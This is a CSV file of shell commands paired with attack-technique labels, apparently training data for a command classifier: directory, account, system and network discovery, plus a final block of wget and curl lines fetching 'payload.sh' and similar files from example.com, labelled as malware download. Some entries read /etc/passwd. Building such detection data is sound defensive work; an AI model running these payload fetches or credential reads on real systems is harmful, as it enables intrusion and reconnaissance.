command,label
pwd,Directory Recon
pwd -P,Directory Recon
ls,Directory Recon
ls -la,Directory Recon
ls -lah,Directory Recon
ls -al /tmp,Directory Recon
find . -maxdepth 2 -type d,Directory Recon
find /home -type d,Directory Recon
find /var -type d,Directory Recon
tree,Directory Recon
tree -L 2,Directory Recon
tree -L 1,Directory Recon
tree /tmp,Directory Recon
echo $PWD,Directory Recon
"printf '%s\n' ""$PWD""",Directory Recon
dirs,Directory Recon
pushd /tmp,Directory Recon
popd,Directory Recon
ls -d */,Directory Recon
find . -type d -name '*.git',Directory Recon
find /tmp -maxdepth 1 -type d,Directory Recon
du -sh .,Directory Recon
du -sh /tmp,Directory Recon
ls /etc,Directory Recon
find . -maxdepth 1 -type d,Directory Recon
echo hello,Generic Execution
echo test,Generic Execution
printf 'hello\n',Generic Execution
printf 'test\n',Generic Execution
date,Generic Execution
date +%Y-%m-%d,Generic Execution
clear,Generic Execution
TRUE,Generic Execution
FALSE,Generic Execution
sleep 1,Generic Execution
sleep 2,Generic Execution
printf '%s' ok,Generic Execution
echo done,Generic Execution
echo status,Generic Execution
echo test123,Generic Execution
printf 'sample',Generic Execution
true && echo done,Generic Execution
false || echo fallback,Generic Execution
sleep 0,Generic Execution
echo hello world,Generic Execution
printf 'training sample\n',Generic Execution
echo completed,Generic Execution
date -u,Generic Execution
printf '%d\n' 10,Generic Execution
reset,Generic Execution
who,Account Discovery
who -a,Account Discovery
who -q,Account Discovery
w,Account Discovery
w -h,Account Discovery
users,Account Discovery
whoami,Account Discovery
id,Account Discovery
id root,Account Discovery
groups,Account Discovery
groups $USER,Account Discovery
last,Account Discovery
last -n 5,Account Discovery
lastlog,Account Discovery
getent passwd,Account Discovery
getent passwd root,Account Discovery
getent group,Account Discovery
getent group sudo,Account Discovery
getent group adm,Account Discovery
cat /etc/passwd,Account Discovery
cat /etc/group,Account Discovery
compgen -u,Account Discovery
compgen -g,Account Discovery
cut -d: -f1 /etc/passwd,Account Discovery
awk -F: '{print $1}' /etc/passwd,Account Discovery
uname,System Discovery
uname -a,System Discovery
uname -r,System Discovery
uname -m,System Discovery
hostname,System Discovery
hostname -f,System Discovery
hostnamectl,System Discovery
uptime,System Discovery
uptime -p,System Discovery
lscpu,System Discovery
lsblk,System Discovery
free -h,System Discovery
free -m,System Discovery
df -h,System Discovery
df -T,System Discovery
df -i,System Discovery
cat /etc/os-release,System Discovery
cat /proc/version,System Discovery
cat /proc/cpuinfo,System Discovery
cat /proc/meminfo,System Discovery
vmstat,System Discovery
arch,System Discovery
nproc,System Discovery
nproc --all,System Discovery
lsb_release -a,System Discovery
ip addr,System Network Discovery
ip a,System Network Discovery
ip link,System Network Discovery
ip route,System Network Discovery
ip neigh,System Network Discovery
ifconfig,System Network Discovery
ifconfig -a,System Network Discovery
ifconfig eth0,System Network Discovery
route -n,System Network Discovery
ss -tuln,System Network Discovery
ss -tunap,System Network Discovery
netstat -tuln,System Network Discovery
netstat -rn,System Network Discovery
arp -a,System Network Discovery
arp -n,System Network Discovery
cat /etc/resolv.conf,System Network Discovery
cat /etc/hosts,System Network Discovery
getent hosts localhost,System Network Discovery
hostname -I,System Network Discovery
ip -br addr,System Network Discovery
ip -br link,System Network Discovery
ip route show,System Network Discovery
ip neigh show,System Network Discovery
ss -lnt,System Network Discovery
ss -lun,System Network Discovery
wget http://example.com/payload.sh,Malware Download
wget https://example.com/file.bin,Malware Download
curl -O https://example.com/file.sh,Malware Download
curl -o /tmp/file.bin https://example.com/file.bin,Malware Download
wget -q http://example.com/archive.tar.gz,Malware Download
curl -L https://example.com/payload,Malware Download
wget http://example.com/update.bin,Malware Download
curl -fsSL https://example.com/script.sh,Malware Download
